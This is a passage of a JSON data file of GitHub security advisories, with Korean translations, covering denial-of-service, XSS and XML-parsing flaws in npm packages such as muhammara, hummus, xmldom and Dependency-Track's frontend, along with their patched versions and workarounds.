    "references": "https://github.com/julianhille/MuhammaraJS/security/advisories/GHSA-rcrx-fpjp-mfrw\nhttps://github.com/galkahana/HummusJS/issues/293\nhttps://github.com/julianhille/MuhammaraJS/issues/191\nhttps://github.com/julianhille/MuhammaraJS/pull/194\nhttps://github.com/galkahana/HummusJS/commit/a9bf2520ab5abb69f9328906e406fbebfb36159a\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-39381\nhttps://github.com/advisories/GHSA-rcrx-fpjp-mfrw",
    "name": "muhammara",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.6.0",
    "identifier": "2.6.0",
    "descriptionKR": "### 영향\n2.6.0 이전의 패키지 muhammara; 패키지 hummus의 모든 버전은 악의적으로 제작된 PDF 파일과 함께 제공되어 다른 파일에 추가될 경우 서비스 거부(DoS)에 취약합니다.\n\n### 패치\n2.6.0에서 muhammara에 대해 패치되었으며 hummus에 대해서는 전혀 패치되지 않았습니다.\n\n### 해결 방법\n신뢰할 수 없는 소스의 파일을 처리하지 마십시오\n\n### 참조\n홍보: https://github.com/julianhille/MuhammaraJS/pull/194\n문제: https://github.com/julianhille/MuhammaraJS/issues/191\nhummus의 문제: https://github.com/galkahana/HummusJS/issues/293\n\n### https://nvd.nist.gov/vuln/detail/CVE-2022-25892의 차이점 개요\n\n차이점은 [src/deps/PDFWriter/PDFParser.cpp](https://github.com/julianhille/MuhammaraJS/commit/1890fb555eaf171db79b73fdc3ea543bbd63c002#diff-09ac2c64aeab42b14b2ae7b11a5648314286 986f8c8444a5b3739ba7203b1e9b)이고 다른 하나는 [PDFDocumentHandler.cpp](https: //github.com/julianhille/MuhammaraJS/pull/194/files#diff-38d338ea4c047fd7dd9a05b5ffe7c964f0fa7e79aff4c307ccee7596457b1ef2) 둘 다 널 포인터이지만 다른 경우\n이들은 완전히 다른 문제입니다. 하나는 PDF를 읽는 것이고 다른 하나는 악의적으로 제작된 것을 추가하는 것입니다. 함수 호출은 해결되는 버전이 다릅니다."
  },
  {
    "description": "The package muhammara before 2.6.0 and the package hummus before 1.0.111 are vulnerable to Denial of Service (DoS) when PDFStreamForResponse() is used with invalid data.",
    "identifiers": "GHSA : GHSA-frp9-2v6r-gj97\nCVE : CVE-2022-25885",
    "severity": "HIGH",
    "updatedAt": "2023-01-31T05:03:39Z",
    "publishedAt": "2022-11-01T12:00:30Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25885\nhttps://github.com/galkahana/HummusJS/issues/439\nhttps://github.com/julianhille/MuhammaraJS/issues/188\nhttps://github.com/julianhille/MuhammaraJS/commit/0a6427eec82ef2978995e453de2dc0d6224dd46c\nhttps://security.snyk.io/vuln/SNYK-JS-HUMMUS-3091139\nhttps://security.snyk.io/vuln/SNYK-JS-MUHAMMARA-3091137\nhttps://github.com/galkahana/HummusJS/commit/a9bf2520ab5abb69f9328906e406fbebfb36159a\nhttps://github.com/advisories/GHSA-frp9-2v6r-gj97",
    "name": "hummus",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 1.0.0, <= 1.0.110",
    "identifier": "1.0.111",
    "descriptionKR": "2.6.0 이전의 muhammara 패키지와 1.0.111 이전의 패키지 hummus는 유효하지 않은 데이터와 함께 PDFStreamForResponse()를 사용할 때 서비스 거부(DoS)에 취약합니다."
  },
  {
    "description": "### Impact\nThe package muhammara before 2.6.1, from 3.0.0 and before 3.1.1; all versions of package hummus are vulnerable to Denial of Service (DoS) when supplied with a maliciously crafted PDF file to be parsed.\n\n### Patches\nIt has been patched in 3.1.1 and has been backported to 2.6.1\nHummus has a patch in 1.0.111.\n\n### Workarounds\nDo not process files from untrusted sources or update.\n\n### References\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-25892\nhttps://github.com/galkahana/HummusJS/issues/463\nhttps://github.com/julianhille/MuhammaraJS/issues/214\nhttps://github.com/julianhille/MuhammaraJS/commit/1890fb555eaf171db79b73fdc3ea543bbd63c002\nhttps://github.com/julianhille/MuhammaraJS/commit/90b278d09f16062d93a4160ef0a54d449d739c51\nhttps://security.snyk.io/vuln/SNYK-JS-HUMMUS-3091138\nhttps://security.snyk.io/vuln/SNYK-JS-MUHAMMARA-3060320\n",
    "identifiers": "GHSA : GHSA-9cv5-4wqv-9w94\nCVE : CVE-2022-25892",
    "severity": "HIGH",
    "updatedAt": "2023-01-31T05:04:08Z",
    "publishedAt": "2022-11-01T12:00:30Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25892\nhttps://github.com/galkahana/HummusJS/issues/463\nhttps://github.com/julianhille/MuhammaraJS/issues/214\nhttps://github.com/julianhille/MuhammaraJS/commit/1890fb555eaf171db79b73fdc3ea543bbd63c002\nhttps://github.com/julianhille/MuhammaraJS/commit/90b278d09f16062d93a4160ef0a54d449d739c51\nhttps://security.snyk.io/vuln/SNYK-JS-HUMMUS-3091138\nhttps://security.snyk.io/vuln/SNYK-JS-MUHAMMARA-3060320\nhttps://github.com/julianhille/MuhammaraJS/security/advisories/GHSA-f64j-4x74-p42m\nhttps://github.com/galkahana/HummusJS/commit/a9bf2520ab5abb69f9328906e406fbebfb36159a\nhttps://github.com/advisories/GHSA-9cv5-4wqv-9w94",
    "name": "hummus",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.0.111",
    "identifier": "1.0.111",
    "descriptionKR": "### 영향\n패키지 muhammara 2.6.1 이전, 3.0.0 및 3.1.1 이전; 패키지 hummus의 모든 버전은 구문 분석할 악의적으로 제작된 PDF 파일과 함께 제공된 경우 서비스 거부(DoS)에 취약합니다.\n\n### 패치\n3.1.1에서 패치되었으며 2.6.1로 백포트되었습니다.\nHummus는 1.0.111에 패치가 있습니다.\n\n### 해결 방법\n신뢰할 수 없는 출처의 파일을 처리하거나 업데이트하지 마십시오.\n\n### 참조\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-25892\nhttps://github.com/galkahana/HummusJS/issues/463\nhttps://github.com/julianhille/MuhammaraJS/issues/214\nhttps://github.com/julianhille/MuhammaraJS/commit/1890fb555eaf171db79b73fdc3ea543bbd63c002\nhttps://github.com/julianhille/MuhammaraJS/commit/90b278d09f16062d93a4160ef0a54d449d739c51\nhttps://security.snyk.io/vuln/SNYK-JS-HUMMUS-3091138\nhttps://security.snyk.io/vuln/SNYK-JS-MUHAMMARA-3060320"
  },
  {
    "description": "The package muhammara before 2.6.0 and the package hummus before 1.0.111 are vulnerable to Denial of Service (DoS) when PDFStreamForResponse() is used with invalid data.",
    "identifiers": "GHSA : GHSA-frp9-2v6r-gj97\nCVE : CVE-2022-25885",
    "severity": "HIGH",
    "updatedAt": "2023-01-31T05:03:39Z",
    "publishedAt": "2022-11-01T12:00:30Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25885\nhttps://github.com/galkahana/HummusJS/issues/439\nhttps://github.com/julianhille/MuhammaraJS/issues/188\nhttps://github.com/julianhille/MuhammaraJS/commit/0a6427eec82ef2978995e453de2dc0d6224dd46c\nhttps://security.snyk.io/vuln/SNYK-JS-HUMMUS-3091139\nhttps://security.snyk.io/vuln/SNYK-JS-MUHAMMARA-3091137\nhttps://github.com/galkahana/HummusJS/commit/a9bf2520ab5abb69f9328906e406fbebfb36159a\nhttps://github.com/advisories/GHSA-frp9-2v6r-gj97",
    "name": "muhammara",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.6.0",
    "identifier": "2.6.0",
    "descriptionKR": "2.6.0 이전의 muhammara 패키지와 1.0.111 이전의 패키지 hummus는 유효하지 않은 데이터와 함께 PDFStreamForResponse()를 사용할 때 서비스 거부(DoS)에 취약합니다."
  },
  {
    "description": "### Impact\nThe package muhammara before 2.6.1, from 3.0.0 and before 3.1.1; all versions of package hummus are vulnerable to Denial of Service (DoS) when supplied with a maliciously crafted PDF file to be parsed.\n\n### Patches\nIt has been patched in 3.1.1 and has been backported to 2.6.1\nHummus has a patch in 1.0.111.\n\n### Workarounds\nDo not process files from untrusted sources or update.\n\n### References\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-25892\nhttps://github.com/galkahana/HummusJS/issues/463\nhttps://github.com/julianhille/MuhammaraJS/issues/214\nhttps://github.com/julianhille/MuhammaraJS/commit/1890fb555eaf171db79b73fdc3ea543bbd63c002\nhttps://github.com/julianhille/MuhammaraJS/commit/90b278d09f16062d93a4160ef0a54d449d739c51\nhttps://security.snyk.io/vuln/SNYK-JS-HUMMUS-3091138\nhttps://security.snyk.io/vuln/SNYK-JS-MUHAMMARA-3060320\n",
    "identifiers": "GHSA : GHSA-9cv5-4wqv-9w94\nCVE : CVE-2022-25892",
    "severity": "HIGH",
    "updatedAt": "2023-01-31T05:04:08Z",
    "publishedAt": "2022-11-01T12:00:30Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25892\nhttps://github.com/galkahana/HummusJS/issues/463\nhttps://github.com/julianhille/MuhammaraJS/issues/214\nhttps://github.com/julianhille/MuhammaraJS/commit/1890fb555eaf171db79b73fdc3ea543bbd63c002\nhttps://github.com/julianhille/MuhammaraJS/commit/90b278d09f16062d93a4160ef0a54d449d739c51\nhttps://security.snyk.io/vuln/SNYK-JS-HUMMUS-3091138\nhttps://security.snyk.io/vuln/SNYK-JS-MUHAMMARA-3060320\nhttps://github.com/julianhille/MuhammaraJS/security/advisories/GHSA-f64j-4x74-p42m\nhttps://github.com/galkahana/HummusJS/commit/a9bf2520ab5abb69f9328906e406fbebfb36159a\nhttps://github.com/advisories/GHSA-9cv5-4wqv-9w94",
    "name": "muhammara",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 3.0.0, < 3.1.1",
    "identifier": "3.1.1",
    "descriptionKR": "### 영향\n패키지 muhammara 2.6.1 이전, 3.0.0 및 3.1.1 이전; 패키지 hummus의 모든 버전은 구문 분석할 악의적으로 제작된 PDF 파일과 함께 제공된 경우 서비스 거부(DoS)에 취약합니다.\n\n### 패치\n3.1.1에서 패치되었으며 2.6.1로 백포트되었습니다.\nHummus는 1.0.111에 패치가 있습니다.\n\n### 해결 방법\n신뢰할 수 없는 출처의 파일을 처리하거나 업데이트하지 마십시오.\n\n### 참조\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-25892\nhttps://github.com/galkahana/HummusJS/issues/463\nhttps://github.com/julianhille/MuhammaraJS/issues/214\nhttps://github.com/julianhille/MuhammaraJS/commit/1890fb555eaf171db79b73fdc3ea543bbd63c002\nhttps://github.com/julianhille/MuhammaraJS/commit/90b278d09f16062d93a4160ef0a54d449d739c51\nhttps://security.snyk.io/vuln/SNYK-JS-HUMMUS-3091138\nhttps://security.snyk.io/vuln/SNYK-JS-MUHAMMARA-3060320"
  },
  {
    "description": "### Impact\nThe package muhammara before 2.6.1, from 3.0.0 and before 3.1.1; all versions of package hummus are vulnerable to Denial of Service (DoS) when supplied with a maliciously crafted PDF file to be parsed.\n\n### Patches\nIt has been patched in 3.1.1 and has been backported to 2.6.1\nHummus has a patch in 1.0.111.\n\n### Workarounds\nDo not process files from untrusted sources or update.\n\n### References\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-25892\nhttps://github.com/galkahana/HummusJS/issues/463\nhttps://github.com/julianhille/MuhammaraJS/issues/214\nhttps://github.com/julianhille/MuhammaraJS/commit/1890fb555eaf171db79b73fdc3ea543bbd63c002\nhttps://github.com/julianhille/MuhammaraJS/commit/90b278d09f16062d93a4160ef0a54d449d739c51\nhttps://security.snyk.io/vuln/SNYK-JS-HUMMUS-3091138\nhttps://security.snyk.io/vuln/SNYK-JS-MUHAMMARA-3060320\n",
    "identifiers": "GHSA : GHSA-9cv5-4wqv-9w94\nCVE : CVE-2022-25892",
    "severity": "HIGH",
    "updatedAt": "2023-01-31T05:04:08Z",
    "publishedAt": "2022-11-01T12:00:30Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25892\nhttps://github.com/galkahana/HummusJS/issues/463\nhttps://github.com/julianhille/MuhammaraJS/issues/214\nhttps://github.com/julianhille/MuhammaraJS/commit/1890fb555eaf171db79b73fdc3ea543bbd63c002\nhttps://github.com/julianhille/MuhammaraJS/commit/90b278d09f16062d93a4160ef0a54d449d739c51\nhttps://security.snyk.io/vuln/SNYK-JS-HUMMUS-3091138\nhttps://security.snyk.io/vuln/SNYK-JS-MUHAMMARA-3060320\nhttps://github.com/julianhille/MuhammaraJS/security/advisories/GHSA-f64j-4x74-p42m\nhttps://github.com/galkahana/HummusJS/commit/a9bf2520ab5abb69f9328906e406fbebfb36159a\nhttps://github.com/advisories/GHSA-9cv5-4wqv-9w94",
    "name": "muhammara",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.6.1",
    "identifier": "2.6.1",
    "descriptionKR": "### 영향\n패키지 muhammara 2.6.1 이전, 3.0.0 및 3.1.1 이전; 패키지 hummus의 모든 버전은 구문 분석할 악의적으로 제작된 PDF 파일과 함께 제공된 경우 서비스 거부(DoS)에 취약합니다.\n\n### 패치\n3.1.1에서 패치되었으며 2.6.1로 백포트되었습니다.\nHummus는 1.0.111에 패치가 있습니다.\n\n### 해결 방법\n신뢰할 수 없는 출처의 파일을 처리하거나 업데이트하지 마십시오.\n\n### 참조\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-25892\nhttps://github.com/galkahana/HummusJS/issues/463\nhttps://github.com/julianhille/MuhammaraJS/issues/214\nhttps://github.com/julianhille/MuhammaraJS/commit/1890fb555eaf171db79b73fdc3ea543bbd63c002\nhttps://github.com/julianhille/MuhammaraJS/commit/90b278d09f16062d93a4160ef0a54d449d739c51\nhttps://security.snyk.io/vuln/SNYK-JS-HUMMUS-3091138\nhttps://security.snyk.io/vuln/SNYK-JS-MUHAMMARA-3060320"
  },
  {
    "description": "node-red-dashboard contains a cross-site scripting vulnerability. This issue affects some unknown processing of the file `components/ui-component/ui-component-ctrl.js` of the component ui_text Format Handler. The attack may be initiated remotely. The issue is patched in version 3.2.0. ",
    "identifiers": "GHSA : GHSA-vrv9-3x3w-ffxw\nCVE : CVE-2022-3783",
    "severity": "MODERATE",
    "updatedAt": "2023-02-01T05:04:20Z",
    "publishedAt": "2022-11-01T12:00:36Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-3783\nhttps://github.com/node-red/node-red-dashboard/issues/772\nhttps://github.com/node-red/node-red-dashboard/commit/9305d1a82f19b235dfad24a7d1dd4ed244db7743\nhttps://vuldb.com/?id.212555\nhttps://github.com/advisories/GHSA-vrv9-3x3w-ffxw",
    "name": "node-red-dashboard",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.2.0",
    "identifier": "3.2.0",
    "descriptionKR": "node-red-dashboard에는 교차 사이트 스크립팅 취약점이 포함되어 있습니다. 이 문제는 구성 요소 ui_text 형식 처리기의 `components/ui-component/ui-component-ctrl.js` 파일의 일부 알 수 없는 처리에 영향을 줍니다. 공격은 원격으로 시작될 수 있습니다. 이 문제는 버전 3.2.0에서 패치되었습니다."
  },
  {
    "description": "### Impact\nxmldom parses XML that is not well-formed because it contains multiple top level elements, and adds all root nodes to the `childNodes` collection of the `Document`, without reporting any error or throwing.\nThis breaks the assumption that there is only a single root node in the tree, which led to https://nvd.nist.gov/vuln/detail/CVE-2022-39299 and is a potential issue for dependents.\n\n### Patches\nUpdate to `@xmldom/xmldom@~0.7.7`, `@xmldom/xmldom@~0.8.4` (dist-tag `latest`) or `@xmldom/xmldom@>=0.9.0-beta.4` (dist-tag `next`).\n\n### Workarounds\nOne of the following approaches might help, depending on your use case:\n- Instead of searching for elements in the whole DOM, only search in the `documentElement`.\n- Reject a document with a document that has more then 1 `childNode`.\n\n### References\n- https://nvd.nist.gov/vuln/detail/CVE-2022-39299\n- https://github.com/jindw/xmldom/issues/150\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at security@xmldom.org\n",
    "identifiers": "GHSA : GHSA-crh6-fp67-6883\nCVE : CVE-2022-39353",
    "severity": "CRITICAL",
    "updatedAt": "2023-03-31T16:06:26Z",
    "publishedAt": "2022-11-01T17:29:11Z",
    "references": "https://github.com/xmldom/xmldom/security/advisories/GHSA-crh6-fp67-6883\nhttps://github.com/xmldom/xmldom/releases/tag/0.7.7\nhttps://github.com/xmldom/xmldom/releases/tag/0.8.4\nhttps://github.com/xmldom/xmldom/releases/tag/0.9.0-beta.4\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-39353\nhttps://github.com/jindw/xmldom/issues/150\nhttps://lists.debian.org/debian-lts-announce/2023/01/msg00000.html\nhttps://github.com/xmldom/xmldom/commit/52a708360c35aa160fcca8621720d71fd0f95f1a\nhttps://github.com/xmldom/xmldom/commit/7ff7c10ab2961703ac1752e95b4ff60ee4ee6643\nhttps://github.com/xmldom/xmldom/commit/c02f786216bed70825f9a351c65e61500f51e931\nhttps://github.com/advisories/GHSA-crh6-fp67-6883",
    "name": "@xmldom/xmldom",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 0.9.0-beta.1, < 0.9.0-beta.4",
    "identifier": "0.9.0-beta.4",
    "descriptionKR": "### 영향\nxmldom은 여러 개의 최상위 요소를 포함하고 있기 때문에 제대로 구성되지 않은 XML을 구문 분석하고 오류를 보고하거나 던지지 않고 모든 루트 노드를 `Document`의 `childNodes` 컬렉션에 추가합니다.\n이는 트리에 단일 루트 노드만 있다는 가정을 깨고 https://nvd.nist.gov/vuln/detail/CVE-2022-39299로 이어지며 종속 항목에 대한 잠재적인 문제입니다.\n\n### 패치\n`@xmldom/xmldom@~0.7.7`, `@xmldom/xmldom@~0.8.4`(dist-tag `latest`) 또는 `@xmldom/xmldom@>=0.9.0-beta.4`로 업데이트 (dist-tag `다음`).\n\n### 해결 방법\n사용 사례에 따라 다음 접근 방식 중 하나가 도움이 될 수 있습니다.\n- 전체 DOM에서 요소를 검색하는 대신 `documentElement`에서만 요소를 검색합니다.\n- `childNode`가 1개 이상인 문서가 포함된 문서를 거부합니다.\n\n### 참조\n- https://nvd.nist.gov/vuln/detail/CVE-2022-39299\n- https://github.com/jindw/xmldom/issues/150\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n* security@xmldom.org로 이메일을 보내주세요."
  },
  {
    "description": "### Impact\nxmldom parses XML that is not well-formed because it contains multiple top level elements, and adds all root nodes to the `childNodes` collection of the `Document`, without reporting any error or throwing.\nThis breaks the assumption that there is only a single root node in the tree, which led to https://nvd.nist.gov/vuln/detail/CVE-2022-39299 and is a potential issue for dependents.\n\n### Patches\nUpdate to `@xmldom/xmldom@~0.7.7`, `@xmldom/xmldom@~0.8.4` (dist-tag `latest`) or `@xmldom/xmldom@>=0.9.0-beta.4` (dist-tag `next`).\n\n### Workarounds\nOne of the following approaches might help, depending on your use case:\n- Instead of searching for elements in the whole DOM, only search in the `documentElement`.\n- Reject a document with a document that has more then 1 `childNode`.\n\n### References\n- https://nvd.nist.gov/vuln/detail/CVE-2022-39299\n- https://github.com/jindw/xmldom/issues/150\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at security@xmldom.org\n",
    "identifiers": "GHSA : GHSA-crh6-fp67-6883\nCVE : CVE-2022-39353",
    "severity": "CRITICAL",
    "updatedAt": "2023-03-31T16:06:26Z",
    "publishedAt": "2022-11-01T17:29:11Z",
    "references": "https://github.com/xmldom/xmldom/security/advisories/GHSA-crh6-fp67-6883\nhttps://github.com/xmldom/xmldom/releases/tag/0.7.7\nhttps://github.com/xmldom/xmldom/releases/tag/0.8.4\nhttps://github.com/xmldom/xmldom/releases/tag/0.9.0-beta.4\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-39353\nhttps://github.com/jindw/xmldom/issues/150\nhttps://lists.debian.org/debian-lts-announce/2023/01/msg00000.html\nhttps://github.com/xmldom/xmldom/commit/52a708360c35aa160fcca8621720d71fd0f95f1a\nhttps://github.com/xmldom/xmldom/commit/7ff7c10ab2961703ac1752e95b4ff60ee4ee6643\nhttps://github.com/xmldom/xmldom/commit/c02f786216bed70825f9a351c65e61500f51e931\nhttps://github.com/advisories/GHSA-crh6-fp67-6883",
    "name": "@xmldom/xmldom",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 0.8.0, < 0.8.4",
    "identifier": "0.8.4",
    "descriptionKR": "### 영향\nxmldom은 여러 개의 최상위 요소를 포함하고 있기 때문에 제대로 구성되지 않은 XML을 구문 분석하고 오류를 보고하거나 던지지 않고 모든 루트 노드를 `Document`의 `childNodes` 컬렉션에 추가합니다.\n이는 트리에 단일 루트 노드만 있다는 가정을 깨고 https://nvd.nist.gov/vuln/detail/CVE-2022-39299로 이어지며 종속 항목에 대한 잠재적인 문제입니다.\n\n### 패치\n`@xmldom/xmldom@~0.7.7`, `@xmldom/xmldom@~0.8.4`(dist-tag `latest`) 또는 `@xmldom/xmldom@>=0.9.0-beta.4`로 업데이트 (dist-tag `다음`).\n\n### 해결 방법\n사용 사례에 따라 다음 접근 방식 중 하나가 도움이 될 수 있습니다.\n- 전체 DOM에서 요소를 검색하는 대신 `documentElement`에서만 요소를 검색합니다.\n- `childNode`가 1개 이상인 문서가 포함된 문서를 거부합니다.\n\n### 참조\n- https://nvd.nist.gov/vuln/detail/CVE-2022-39299\n- https://github.com/jindw/xmldom/issues/150\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n* security@xmldom.org로 이메일을 보내주세요."
  },
  {
    "description": "### Impact\nxmldom parses XML that is not well-formed because it contains multiple top level elements, and adds all root nodes to the `childNodes` collection of the `Document`, without reporting any error or throwing.\nThis breaks the assumption that there is only a single root node in the tree, which led to https://nvd.nist.gov/vuln/detail/CVE-2022-39299 and is a potential issue for dependents.\n\n### Patches\nUpdate to `@xmldom/xmldom@~0.7.7`, `@xmldom/xmldom@~0.8.4` (dist-tag `latest`) or `@xmldom/xmldom@>=0.9.0-beta.4` (dist-tag `next`).\n\n### Workarounds\nOne of the following approaches might help, depending on your use case:\n- Instead of searching for elements in the whole DOM, only search in the `documentElement`.\n- Reject a document with a document that has more then 1 `childNode`.\n\n### References\n- https://nvd.nist.gov/vuln/detail/CVE-2022-39299\n- https://github.com/jindw/xmldom/issues/150\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at security@xmldom.org\n",
    "identifiers": "GHSA : GHSA-crh6-fp67-6883\nCVE : CVE-2022-39353",
    "severity": "CRITICAL",
    "updatedAt": "2023-03-31T16:06:26Z",
    "publishedAt": "2022-11-01T17:29:11Z",
    "references": "https://github.com/xmldom/xmldom/security/advisories/GHSA-crh6-fp67-6883\nhttps://github.com/xmldom/xmldom/releases/tag/0.7.7\nhttps://github.com/xmldom/xmldom/releases/tag/0.8.4\nhttps://github.com/xmldom/xmldom/releases/tag/0.9.0-beta.4\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-39353\nhttps://github.com/jindw/xmldom/issues/150\nhttps://lists.debian.org/debian-lts-announce/2023/01/msg00000.html\nhttps://github.com/xmldom/xmldom/commit/52a708360c35aa160fcca8621720d71fd0f95f1a\nhttps://github.com/xmldom/xmldom/commit/7ff7c10ab2961703ac1752e95b4ff60ee4ee6643\nhttps://github.com/xmldom/xmldom/commit/c02f786216bed70825f9a351c65e61500f51e931\nhttps://github.com/advisories/GHSA-crh6-fp67-6883",
    "name": "@xmldom/xmldom",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.7.7",
    "identifier": "0.7.7",
    "descriptionKR": "### 영향\nxmldom은 여러 개의 최상위 요소를 포함하고 있기 때문에 제대로 구성되지 않은 XML을 구문 분석하고 오류를 보고하거나 던지지 않고 모든 루트 노드를 `Document`의 `childNodes` 컬렉션에 추가합니다.\n이는 트리에 단일 루트 노드만 있다는 가정을 깨고 https://nvd.nist.gov/vuln/detail/CVE-2022-39299로 이어지며 종속 항목에 대한 잠재적인 문제입니다.\n\n### 패치\n`@xmldom/xmldom@~0.7.7`, `@xmldom/xmldom@~0.8.4`(dist-tag `latest`) 또는 `@xmldom/xmldom@>=0.9.0-beta.4`로 업데이트 (dist-tag `다음`).\n\n### 해결 방법\n사용 사례에 따라 다음 접근 방식 중 하나가 도움이 될 수 있습니다.\n- 전체 DOM에서 요소를 검색하는 대신 `documentElement`에서만 요소를 검색합니다.\n- `childNode`가 1개 이상인 문서가 포함된 문서를 거부합니다.\n\n### 참조\n- https://nvd.nist.gov/vuln/detail/CVE-2022-39299\n- https://github.com/jindw/xmldom/issues/150\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n* security@xmldom.org로 이메일을 보내주세요."
  },
  {
    "description": "### Impact\nxmldom parses XML that is not well-formed because it contains multiple top level elements, and adds all root nodes to the `childNodes` collection of the `Document`, without reporting any error or throwing.\nThis breaks the assumption that there is only a single root node in the tree, which led to https://nvd.nist.gov/vuln/detail/CVE-2022-39299 and is a potential issue for dependents.\n\n### Patches\nUpdate to `@xmldom/xmldom@~0.7.7`, `@xmldom/xmldom@~0.8.4` (dist-tag `latest`) or `@xmldom/xmldom@>=0.9.0-beta.4` (dist-tag `next`).\n\n### Workarounds\nOne of the following approaches might help, depending on your use case:\n- Instead of searching for elements in the whole DOM, only search in the `documentElement`.\n- Reject a document with a document that has more then 1 `childNode`.\n\n### References\n- https://nvd.nist.gov/vuln/detail/CVE-2022-39299\n- https://github.com/jindw/xmldom/issues/150\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at security@xmldom.org\n",
    "identifiers": "GHSA : GHSA-crh6-fp67-6883\nCVE : CVE-2022-39353",
    "severity": "CRITICAL",
    "updatedAt": "2023-03-31T16:06:26Z",
    "publishedAt": "2022-11-01T17:29:11Z",
    "references": "https://github.com/xmldom/xmldom/security/advisories/GHSA-crh6-fp67-6883\nhttps://github.com/xmldom/xmldom/releases/tag/0.7.7\nhttps://github.com/xmldom/xmldom/releases/tag/0.8.4\nhttps://github.com/xmldom/xmldom/releases/tag/0.9.0-beta.4\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-39353\nhttps://github.com/jindw/xmldom/issues/150\nhttps://lists.debian.org/debian-lts-announce/2023/01/msg00000.html\nhttps://github.com/xmldom/xmldom/commit/52a708360c35aa160fcca8621720d71fd0f95f1a\nhttps://github.com/xmldom/xmldom/commit/7ff7c10ab2961703ac1752e95b4ff60ee4ee6643\nhttps://github.com/xmldom/xmldom/commit/c02f786216bed70825f9a351c65e61500f51e931\nhttps://github.com/advisories/GHSA-crh6-fp67-6883",
    "name": "xmldom",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.6.0",
    "descriptionKR": "### 영향\nxmldom은 여러 개의 최상위 요소를 포함하고 있기 때문에 제대로 구성되지 않은 XML을 구문 분석하고 오류를 보고하거나 던지지 않고 모든 루트 노드를 `Document`의 `childNodes` 컬렉션에 추가합니다.\n이는 트리에 단일 루트 노드만 있다는 가정을 깨고 https://nvd.nist.gov/vuln/detail/CVE-2022-39299로 이어지며 종속 항목에 대한 잠재적인 문제입니다.\n\n### 패치\n`@xmldom/xmldom@~0.7.7`, `@xmldom/xmldom@~0.8.4`(dist-tag `latest`) 또는 `@xmldom/xmldom@>=0.9.0-beta.4`로 업데이트 (dist-tag `다음`).\n\n### 해결 방법\n사용 사례에 따라 다음 접근 방식 중 하나가 도움이 될 수 있습니다.\n- 전체 DOM에서 요소를 검색하는 대신 `documentElement`에서만 요소를 검색합니다.\n- `childNode`가 1개 이상인 문서가 포함된 문서를 거부합니다.\n\n### 참조\n- https://nvd.nist.gov/vuln/detail/CVE-2022-39299\n- https://github.com/jindw/xmldom/issues/150\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n* security@xmldom.org로 이메일을 보내주세요."
  },
  {
    "description": "### Description\n\nDue to the common practice of providing vulnerability details in markdown format, the Dependency-Track frontend renders them using the JavaScript library [Showdown](https://github.com/showdownjs/showdown). Showdown [does not have any XSS countermeasures built in](https://github.com/showdownjs/showdown/wiki/Markdown's-XSS-Vulnerability-(and-how-to-mitigate-it)), and versions before 4.6.1 of the Dependency-Track frontend did not encode or sanitize Showdown's output. This made it possible for arbitrary JavaScript included in vulnerability details via HTML attributes to be executed in context of the frontend.\n\n### Impact\n\nActors with the `VULNERABILITY_MANAGEMENT` permission can exploit this weakness by creating or editing a custom vulnerability and providing XSS payloads in any of the following fields:\n\n* Description\n* Details\n* Recommendation\n* References\n\nThe payload will be executed for users with the `VIEW_PORTFOLIO` permission when browsing to the modified vulnerability's page, for example: \n\n```\nhttps://dtrack.example.com/vulnerabilities/INTERNAL/INT-jd8u-e8tl-8lwu\n```\n\nAlternatively, malicious JavaScript could be introduced via any of the vulnerability databases mirrored by Dependency-Track (NVD, GitHub Advisories, OSV, OSS Index, VulnDB). However, this attack vector is highly unlikely, and the team is not aware of any occurrence of this happening.\n\n> **Note**\n> The *Vulnerability Details* element of the *Audit Vulnerabilities* tab in the project view is **not** affected.\n\n### Patches\n\nThe issue has been fixed in frontend version 4.6.1.\n\n### Credit\n\nThanks to GitHub user **Waterstraal** for finding and responsibly disclosing the issue.",
    "identifiers": "GHSA : GHSA-c33w-pm52-mqvf\nCVE : CVE-2022-39350",
    "severity": "MODERATE",
    "updatedAt": "2023-01-30T05:02:58Z",
    "publishedAt": "2022-10-25T20:22:01Z",
    "references": "https://github.com/DependencyTrack/frontend/security/advisories/GHSA-c33w-pm52-mqvf\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-39350\nhttps://docs.dependencytrack.org/changelog/\nhttps://github.com/showdownjs/showdown/wiki/Markdown's-XSS-Vulnerability-(and-how-to-mitigate-it)\nhttps://github.com/advisories/GHSA-c33w-pm52-mqvf",
    "name": "@dependencytrack/frontend",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.6.1",
    "identifier": "4.6.1",
